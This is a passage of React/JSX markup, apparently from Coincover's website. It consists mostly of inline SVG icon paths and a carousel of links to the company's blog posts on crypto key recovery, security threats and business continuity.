                                              d="M10.007 19.4995C9.86281 19.4995 9.73307 19.4707 9.58891 19.413C9.45917 19.3554 9.34384 19.2833 9.24293 19.1824C9.04111 18.9805 8.92578 18.7066 8.92578 18.4183C8.92578 18.2742 8.95461 18.13 9.01228 18.0003C9.06994 17.8705 9.14202 17.7552 9.24293 17.6543C9.64657 17.2507 10.3674 17.2507 10.771 17.6543C10.9728 17.8561 11.0881 18.13 11.0881 18.4183C11.0881 18.7066 10.9728 18.9805 10.771 19.1824C10.5692 19.3842 10.2953 19.4995 10.007 19.4995Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M12.0401 16.3714C11.622 15.9534 11.622 15.2758 12.0401 14.8434C12.4726 14.4253 13.1501 14.4253 13.5682 14.8434C14.0007 15.2614 14.0007 15.9534 13.5682 16.3714C13.3519 16.5877 13.078 16.6886 12.8041 16.6886C12.5158 16.6886 12.2419 16.5877 12.0257 16.3714H12.0401ZM14.8512 13.5748C14.4331 13.1423 14.4331 12.4648 14.8512 12.0323C15.2692 11.6142 15.9612 11.6142 16.3793 12.0323C16.7973 12.4648 16.7973 13.1423 16.3793 13.5748C16.163 13.7766 15.8891 13.8775 15.6152 13.8775C15.3413 13.8775 15.0674 13.7766 14.8512 13.5748Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M18.4132 11.0855C18.1393 11.0855 17.851 10.9701 17.6492 10.7683C17.4474 10.5665 17.332 10.2782 17.332 10.0043C17.332 9.86011 17.3609 9.71595 17.4185 9.58621C17.4762 9.45647 17.5483 9.34114 17.6492 9.24023C18.0528 8.83659 18.7736 8.83659 19.1773 9.24023C19.3791 9.44205 19.4944 9.71595 19.4944 10.0043C19.4944 10.2926 19.3791 10.5665 19.1773 10.7683C18.9754 10.9701 18.7015 11.0855 18.4132 11.0855Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M14.8524 7.95738C14.4343 7.53932 14.4343 6.84737 14.8524 6.42931C15.2849 6.01125 15.9624 6.01125 16.3805 6.42931C16.8129 6.84737 16.7985 7.53932 16.3805 7.95738C16.1642 8.17362 15.8903 8.27453 15.6164 8.27453C15.3425 8.27453 15.0686 8.17362 14.8524 7.95738ZM12.0557 5.1463C11.6377 4.72825 11.6377 4.0507 12.0557 3.61823C12.4738 3.20017 13.1657 3.20017 13.5838 3.61823C14.0019 4.0507 14.0019 4.72825 13.5838 5.1463C13.3676 5.36254 13.0937 5.46345 12.8198 5.46345C12.5459 5.46345 12.272 5.36254 12.0557 5.1463Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M10.0226 2.66517C9.87843 2.66517 9.73427 2.63634 9.60453 2.57867C9.47479 2.52101 9.35946 2.43451 9.25855 2.34802C9.05673 2.1462 8.94141 1.85788 8.94141 1.56957C8.94141 1.28125 9.05673 1.00735 9.25855 0.805532C9.35946 0.719037 9.47479 0.632542 9.60453 0.574879C10.0082 0.416305 10.4839 0.517216 10.7866 0.805532C10.9884 1.00735 11.1038 1.29567 11.1038 1.56957C11.1038 1.85788 10.9884 2.1462 10.7866 2.34802C10.5848 2.54984 10.3109 2.66517 10.0226 2.66517Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M1.589 11.0855C1.3151 11.0855 1.02678 10.9701 0.82496 10.7683C0.623139 10.5665 0.507813 10.2782 0.507813 10.0043C0.507812 9.71595 0.623139 9.42764 0.82496 9.24023C1.2286 8.83659 1.96381 8.83659 2.35303 9.24023C2.55485 9.42764 2.67018 9.71595 2.67018 10.0043C2.67018 10.2926 2.55485 10.5665 2.35303 10.7683C2.15121 10.9701 1.87731 11.0855 1.589 11.0855Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M7.97588 10.0031C7.97588 9.3976 8.46601 8.92188 9.05706 8.92188C9.64811 8.92188 10.1382 9.3976 10.1382 10.0031C10.1382 10.5941 9.64811 11.0842 9.05706 11.0842C8.46601 11.0842 7.97588 10.5941 7.97588 10.0031ZM4.24219 10.0031C4.24219 9.3976 4.73232 8.92188 5.32337 8.92188C5.92883 8.92188 6.40456 9.3976 6.40456 10.0031C6.40456 10.5941 5.92883 11.0842 5.32337 11.0842C4.73232 11.0842 4.24219 10.5941 4.24219 10.0031Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M12.7882 11.0855C12.4999 11.0855 12.226 10.9701 12.0242 10.7683C11.8224 10.5665 11.707 10.2782 11.707 10.0043C11.707 9.71595 11.8224 9.42764 12.0242 9.24023C12.4278 8.83659 13.1486 8.83659 13.5523 9.24023C13.7541 9.42764 13.8694 9.71595 13.8694 10.0043C13.8694 10.2926 13.7541 10.5665 13.5523 10.7683C13.3504 10.9701 13.0765 11.0855 12.7882 11.0855Z"
                                              fill="#3939EF"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_2048_64919">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="translate(0.507812 0.5)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </div>
                                    </div>
                                    <div className="custom_arrows_section mobile_view">
                                      <div className="prev_slide">
                                        <svg
                                          width={56}
                                          height={57}
                                          viewBox="0 0 56 57"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_2767_131681)">
                                            <path
                                              d="M27.9925 19.1958C28.1367 19.1958 28.2664 19.2246 28.4106 19.2823C28.5403 19.34 28.6557 19.412 28.7566 19.5129C28.9584 19.7148 29.0737 19.9887 29.0737 20.277C29.0737 20.4211 29.0449 20.5653 28.9872 20.695C28.9296 20.8248 28.8575 20.9401 28.7566 21.041C28.3529 21.4447 27.6322 21.4447 27.2285 21.041C27.0267 20.8392 26.9114 20.5653 26.9114 20.277C26.9114 19.9887 27.0267 19.7148 27.2285 19.5129C27.4303 19.3111 27.7042 19.1958 27.9925 19.1958Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M25.9599 22.3239C26.378 22.7419 26.378 23.4195 25.9599 23.8519C25.5274 24.27 24.8499 24.27 24.4318 23.8519C23.9993 23.4339 23.9993 22.7419 24.4318 22.3239C24.6481 22.1076 24.922 22.0067 25.1959 22.0067C25.4842 22.0067 25.7581 22.1076 25.9743 22.3239H25.9599ZM23.1488 25.1205C23.5669 25.553 23.5669 26.2305 23.1488 26.663C22.7308 27.0811 22.0388 27.0811 21.6207 26.663C21.2027 26.2305 21.2027 25.553 21.6207 25.1205C21.837 24.9187 22.1109 24.8178 22.3848 24.8178C22.6587 24.8178 22.9326 24.9187 23.1488 25.1205Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M19.5882 27.6099C19.8621 27.6099 20.1505 27.7252 20.3523 27.927C20.5541 28.1288 20.6694 28.4171 20.6694 28.691C20.6694 28.8352 20.6406 28.9794 20.5829 29.1091C20.5253 29.2388 20.4532 29.3542 20.3523 29.4551C19.9486 29.8587 19.2279 29.8587 18.8242 29.4551C18.6224 29.2533 18.5071 28.9794 18.5071 28.691C18.5071 28.4027 18.6224 28.1288 18.8242 27.927C19.026 27.7252 19.2999 27.6099 19.5882 27.6099Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M23.1491 30.7379C23.5671 31.156 23.5671 31.8479 23.1491 32.266C22.7166 32.6841 22.0391 32.6841 21.621 32.266C21.1885 31.8479 21.2029 31.156 21.621 30.7379C21.8372 30.5217 22.1111 30.4208 22.385 30.4208C22.6589 30.4208 22.9328 30.5217 23.1491 30.7379ZM25.9457 33.549C26.3638 33.9671 26.3638 34.6446 25.9457 35.0771C25.5277 35.4951 24.8357 35.4951 24.4177 35.0771C23.9996 34.6446 23.9996 33.9671 24.4177 33.549C24.6339 33.3328 24.9078 33.2319 25.1817 33.2319C25.4556 33.2319 25.7295 33.3328 25.9457 33.549Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M27.9779 36.0301C28.1221 36.0301 28.2662 36.059 28.396 36.1166C28.5257 36.1743 28.641 36.2608 28.7419 36.3473C28.9438 36.5491 29.0591 36.8374 29.0591 37.1257C29.0591 37.4141 28.9438 37.688 28.7419 37.8898C28.641 37.9763 28.5257 38.0628 28.396 38.1204C27.9923 38.279 27.5166 38.1781 27.2139 37.8898C27.012 37.688 26.8967 37.3996 26.8967 37.1257C26.8967 36.8374 27.012 36.5491 27.2139 36.3473C27.4157 36.1455 27.6896 36.0301 27.9779 36.0301Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M36.4115 27.6099C36.6854 27.6099 36.9737 27.7252 37.1755 27.927C37.3773 28.1288 37.4927 28.4171 37.4927 28.691C37.4927 28.9794 37.3773 29.2677 37.1755 29.4551C36.7719 29.8587 36.0367 29.8587 35.6475 29.4551C35.4456 29.2677 35.3303 28.9794 35.3303 28.691C35.3303 28.4027 35.4456 28.1288 35.6475 27.927C35.8493 27.7252 36.1232 27.6099 36.4115 27.6099Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M30.0251 28.6923C30.0251 29.2977 29.535 29.7734 28.9439 29.7734C28.3529 29.7734 27.8627 29.2977 27.8627 28.6923C27.8627 28.1012 28.3529 27.6111 28.9439 27.6111C29.535 27.6111 30.0251 28.1012 30.0251 28.6923ZM33.7588 28.6923C33.7588 29.2977 33.2687 29.7734 32.6776 29.7734C32.0721 29.7734 31.5964 29.2977 31.5964 28.6923C31.5964 28.1012 32.0721 27.6111 32.6776 27.6111C33.2687 27.6111 33.7588 28.1012 33.7588 28.6923Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M25.2103 27.6099C25.4986 27.6099 25.7725 27.7252 25.9744 27.927C26.1762 28.1288 26.2915 28.4171 26.2915 28.691C26.2915 28.9794 26.1762 29.2677 25.9744 29.4551C25.5707 29.8587 24.8499 29.8587 24.4463 29.4551C24.2445 29.2677 24.1291 28.9794 24.1291 28.691C24.1291 28.4027 24.2445 28.1288 24.4463 27.927C24.6481 27.7252 24.922 27.6099 25.2103 27.6099Z"
                                              fill="#9C9CF7"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_2767_131681">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="matrix(-1 0 0 -1 37.4927 38.1953)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </div>
                                      <div className="next_slide">
                                        <svg
                                          width={56}
                                          height={57}
                                          viewBox="0 0 56 57"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_2767_131683)">
                                            <path
                                              d="M28.0075 38.1948C27.8633 38.1948 27.7336 38.166 27.5894 38.1083C27.4597 38.0507 27.3443 37.9786 27.2434 37.8777C27.0416 37.6759 26.9263 37.402 26.9263 37.1136C26.9263 36.9695 26.9551 36.8253 27.0128 36.6956C27.0704 36.5658 27.1425 36.4505 27.2434 36.3496C27.6471 35.946 28.3678 35.946 28.7715 36.3496C28.9733 36.5514 29.0886 36.8253 29.0886 37.1136C29.0886 37.402 28.9733 37.6759 28.7715 37.8777C28.5697 38.0795 28.2958 38.1948 28.0075 38.1948Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M30.0401 35.0668C29.622 34.6487 29.622 33.9712 30.0401 33.5387C30.4726 33.1206 31.1501 33.1206 31.5682 33.5387C32.0007 33.9567 32.0007 34.6487 31.5682 35.0668C31.3519 35.283 31.078 35.3839 30.8041 35.3839C30.5158 35.3839 30.2419 35.283 30.0257 35.0668H30.0401ZM32.8512 32.2701C32.4331 31.8376 32.4331 31.1601 32.8512 30.7276C33.2692 30.3095 33.9612 30.3095 34.3793 30.7276C34.7973 31.1601 34.7973 31.8376 34.3793 32.2701C34.163 32.4719 33.8891 32.5728 33.6152 32.5728C33.3413 32.5728 33.0674 32.4719 32.8512 32.2701Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M36.4118 29.7808C36.1379 29.7808 35.8495 29.6654 35.6477 29.4636C35.4459 29.2618 35.3306 28.9735 35.3306 28.6996C35.3306 28.5554 35.3594 28.4113 35.4171 28.2815C35.4747 28.1518 35.5468 28.0365 35.6477 27.9355C36.0514 27.5319 36.7721 27.5319 37.1758 27.9355C37.3776 28.1374 37.4929 28.4113 37.4929 28.6996C37.4929 28.9879 37.3776 29.2618 37.1758 29.4636C36.974 29.6654 36.7001 29.7808 36.4118 29.7808Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M32.8509 26.6527C32.4329 26.2346 32.4329 25.5427 32.8509 25.1246C33.2834 24.7066 33.9609 24.7066 34.379 25.1246C34.8115 25.5427 34.7971 26.2346 34.379 26.6527C34.1628 26.8689 33.8889 26.9698 33.615 26.9698C33.3411 26.9698 33.0672 26.8689 32.8509 26.6527ZM30.0543 23.8416C29.6362 23.4236 29.6362 22.746 30.0543 22.3135C30.4723 21.8955 31.1643 21.8955 31.5823 22.3135C32.0004 22.746 32.0004 23.4236 31.5823 23.8416C31.3661 24.0579 31.0922 24.1588 30.8183 24.1588C30.5444 24.1588 30.2705 24.0579 30.0543 23.8416Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M28.0221 21.3605C27.8779 21.3605 27.7338 21.3316 27.604 21.274C27.4743 21.2163 27.359 21.1298 27.2581 21.0433C27.0562 20.8415 26.9409 20.5532 26.9409 20.2649C26.9409 19.9766 27.0562 19.7027 27.2581 19.5008C27.359 19.4143 27.4743 19.3279 27.604 19.2702C28.0077 19.1116 28.4834 19.2125 28.7861 19.5008C28.988 19.7027 29.1033 19.991 29.1033 20.2649C29.1033 20.5532 28.988 20.8415 28.7861 21.0433C28.5843 21.2452 28.3104 21.3605 28.0221 21.3605Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M19.5885 29.7808C19.3146 29.7808 19.0263 29.6654 18.8245 29.4636C18.6227 29.2618 18.5073 28.9735 18.5073 28.6996C18.5073 28.4113 18.6227 28.1229 18.8245 27.9355C19.2281 27.5319 19.9633 27.5319 20.3525 27.9355C20.5544 28.1229 20.6697 28.4113 20.6697 28.6996C20.6697 28.9879 20.5544 29.2618 20.3525 29.4636C20.1507 29.6654 19.8768 29.7808 19.5885 29.7808Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M25.9749 28.6984C25.9749 28.0929 26.465 27.6172 27.0561 27.6172C27.6471 27.6172 28.1373 28.0929 28.1373 28.6984C28.1373 29.2894 27.6471 29.7796 27.0561 29.7796C26.465 29.7796 25.9749 29.2894 25.9749 28.6984ZM22.2412 28.6984C22.2412 28.0929 22.7313 27.6172 23.3224 27.6172C23.9279 27.6172 24.4036 28.0929 24.4036 28.6984C24.4036 29.2894 23.9279 29.7796 23.3224 29.7796C22.7313 29.7796 22.2412 29.2894 22.2412 28.6984Z"
                                              fill="#9C9CF7"
                                            />
                                            <path
                                              d="M30.7897 29.7808C30.5014 29.7808 30.2275 29.6654 30.0256 29.4636C29.8238 29.2618 29.7085 28.9735 29.7085 28.6996C29.7085 28.4113 29.8238 28.1229 30.0256 27.9355C30.4293 27.5319 31.1501 27.5319 31.5537 27.9355C31.7555 28.1229 31.8709 28.4113 31.8709 28.6996C31.8709 28.9879 31.7555 29.2618 31.5537 29.4636C31.3519 29.6654 31.078 29.7808 30.7897 29.7808Z"
                                              fill="#9C9CF7"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_2767_131683">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="translate(18.5073 19.1953)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </div>
                                    </div>
                                    <div className="button_wrapper">
                                      <a
                                        className="blue_btn_with_arrow"
                                        href="https://www.coincover.com/blog"
                                      >
                                        <span>See all stories</span>
                                      </a>
                                    </div>
                                  </div>
                                </div>
                                <div className="content_inner">
                                  <div className="slides">
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div
                                          className="image"
                                          style={{
                                            backgroundImage:
                                              'url("https://www.coincover.com/hubfs/7%20reasons%20why%20internal%20key%20recovery%20and%20backup%20is%20riskier%20than%20you%20think-1.png")'
                                          }}
                                        />
                                        <div className="description">
                                          <h6>
                                            <a href="https://www.coincover.com/blog/7-reasons-why-internal-key-recovery-and-backup-is-riskier-than-you-think">
                                              7 reasons why internal key
                                              recovery and backup is riskier
                                              than you think
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="https://www.coincover.com/blog/7-reasons-why-internal-key-recovery-and-backup-is-riskier-than-you-think">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div
                                          className="image"
                                          style={{
                                            backgroundImage:
                                              'url("https://www.coincover.com/hubfs/A%20look%20ahead%20at%206%20emerging%20security%20threats%20for%20crypto%20platforms%20in%202026.png")'
                                          }}
                                        />
                                        <div className="description">
                                          <h6>
                                            <a href="https://www.coincover.com/blog/6-emerging-security-threats-for-crypto-platforms-in-2025">
                                              A look ahead at 6 emerging
                                              security threats for crypto
                                              platforms in 2025
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="https://www.coincover.com/blog/6-emerging-security-threats-for-crypto-platforms-in-2025">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div
                                          className="image"
                                          style={{
                                            backgroundImage:
                                              'url("https://www.coincover.com/hubfs/How%20business%20continuity%20planning%20can%20protect%20institutional%20crypto%20assets.png")'
                                          }}
                                        />
                                        <div className="description">
                                          <h6>
                                            <a href="https://www.coincover.com/blog/how-business-continuity-planning-can-protect-institutional-crypto-assets">
                                              How business continuity planning
                                              can protect institutional crypto
                                              assets
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="https://www.coincover.com/blog/how-business-continuity-planning-can-protect-institutional-crypto-assets">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
